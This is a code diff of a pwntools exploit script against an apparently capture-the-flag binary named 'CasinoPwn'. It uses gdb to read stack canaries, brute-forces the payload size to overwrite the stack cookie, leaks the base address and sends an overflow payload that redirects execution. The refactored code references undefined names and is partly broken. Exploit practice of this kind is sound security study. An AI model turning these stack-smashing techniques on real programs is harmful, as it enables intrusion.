@@ -3,11 +3,11 @@ import pathlib
 import time
 
 import tqdm
-from loguru import logger
 from pwnlib import gdb
 from pwn import p64, u64
 from pwnlib.util.cyclic import cyclic, cyclic_find
 
+from core.gdb_wrapper import GdbApi
 from core.target_config import Config, Mode
 from core.targetbase import TargetBase
 from modules.find_function import FindFunction, Method
@@ -26,72 +26,73 @@ class CasinoPwn(PwnTarget):
     def input_handler(cls, proc: process, payload: bytes, *args, **kwargs):
         return proc.recvline()
 
+    @classmethod
+    def find_canary(cls, debugger_api: GdbApi):
+        debugger_api.interrupt()
+        debugger = debugger_api.api()
+        debugger.execute('thread 2')
+        debugger.execute('break *last_chance+86')
+        debugger.execute('c')
+        t.process.sendline(cyclic(0x900))
+        rax_value = debugger.execute('i r rax', to_string=True).split()[1]
+        rax_value = int(rax_value, 16)
+        canary_value = debugger.execute('x/gx $rsp+0x28', to_string=True).split()[1]
+        debugger.execute('c')
+        canary_value = int(canary_value, 16)
+        saved_canary_value = canary_value ^ rax_value
+        canary_address = cyclic_find(canary_value)
+        cls.logger.success(f'canary_address@{hex(canary_address)}')
+        saved_canary_address = cyclic_find(saved_canary_value)
+        cls.logger.success(f'saved_canary_address@{hex(saved_canary_address)}')
 
-def find_canary(debugger: gdb.Gdb):
-    debugger.interrupt_and_wait()
-    debugger.execute('thread 2')
-    debugger.execute('break *last_chance+86')
-    debugger.execute('c')
-    t.process.sendline(cyclic(0x900))
-    rax_value = debugger.execute('i r rax', to_string=True).split()[1]
-    rax_value = int(rax_value, 16)
-    canary_value = debugger.execute('x/gx $rsp+0x28', to_string=True).split()[1]
-    debugger.execute('c')
-    canary_value = int(canary_value, 16)
-    saved_canary_value = canary_value ^ rax_value
-    canary_address = cyclic_find(canary_value)
-    logger.success(f'canary_address@{hex(canary_address)}')
-    saved_canary_address = cyclic_find(saved_canary_value)
-    logger.success(f'saved_canary_address@{hex(saved_canary_address)}')
 
+    def find_canary_alternative(cls, config: Config):
+        logger.disable('__main__')
+        done = False
+        choices = tuple((range(0x10, 0x900 - 0x38 - 0x8, 0x10)))
+        t = TargetBase(pwn_target=CasinoPwn, config=config)
+        start_address_from_file = t.file.symbols['_start']
+        last_chance_address = t.file.symbols['last_chance']
 
-def find_canary_alternative(config: Config):
-    logger.disable('__main__')
-    done = False
-    choices = tuple((range(0x10, 0x900 - 0x38 - 0x8, 0x10)))
-    t = TargetBase(pwn_target=CasinoPwn, config=config)
-    start_address_from_file = t.file.symbols['_start']
-    last_chance_address = t.file.symbols['last_chance']
-
-    payload = 0x28 * b'A' + 0x8 * b'U' + 0x8 * b'B'
-    with tqdm.tqdm(total=len(choices)) as pbar:
-        i = iter(choices)
-        address = next(i)
-        while address and not done:
-            t.process.sendline(b'1 ' + 11 * b'1.\n' + b'1')
-            t.process.clean(0.7)
-            t.process.sendline(b'.')
-            t.process.recvline()
-            result = t.process.recvline()
-            start_address = int(result.decode().split(' ')[1])
-            file_base = start_address - start_address_from_file
-            assert file_base > 0x550000000000
-            old_data = t.process.clean(0.5)
-            if not old_data:
-                old_data = t.process.clean(0.5)
-            t.process.send_raw(payload + p64(last_chance_address + file_base) + b'U' * address)
-            try:
-                line = t.process.recvline()
-                if not line.startswith(b'***'):
-                    next_payload_size = address - 0x8
-                    print(old_data)
-                    print(line)
-                    print(t.process.clean(0.2))
-                    done = True
-                    break
-            except EOFError:
-                pass
+        payload = 0x28 * b'A' + 0x8 * b'U' + 0x8 * b'B'
+        with tqdm.tqdm(total=len(choices)) as pbar:
+            i = iter(choices)
             address = next(i)
-            pbar.update(1)
-            time.sleep(0.2)
-            t.reconnect()
-    logger.enable('__main__')
-    if done:
-        logger.success(f'Found size of payload to overwrite stack cookie: {hex(next_payload_size)}')
-        t.file.address = file_base
-        return next_payload_size, t
-    logger.critical("Failed to guess payload size")
-    exit(0)
+            while address and not done:
+                t.process.sendline(b'1 ' + 11 * b'1.\n' + b'1')
+                t.process.clean(0.7)
+                t.process.sendline(b'.')
+                t.process.recvline()
+                result = t.process.recvline()
+                start_address = int(result.decode().split(' ')[1])
+                file_base = start_address - start_address_from_file
+                assert file_base > 0x550000000000
+                old_data = t.process.clean(0.5)
+                if not old_data:
+                    old_data = t.process.clean(0.5)
+                t.process.send_raw(payload + p64(last_chance_address + file_base) + b'U' * address)
+                try:
+                    line = t.process.recvline()
+                    if not line.startswith(b'***'):
+                        next_payload_size = address - 0x8
+                        print(old_data)
+                        print(line)
+                        print(t.process.clean(0.2))
+                        done = True
+                        break
+                except EOFError:
+                    pass
+                address = next(i)
+                pbar.update(1)
+                time.sleep(0.2)
+                t.reconnect()
+        logger.enable('__main__')
+        if done:
+            logger.success(f'Found size of payload to overwrite stack cookie: {hex(next_payload_size)}')
+            t.file.address = file_base
+            return next_payload_size, t
+        logger.critical("Failed to guess payload size")
+        exit(0)
 
 
 if __name__ == '__main__':
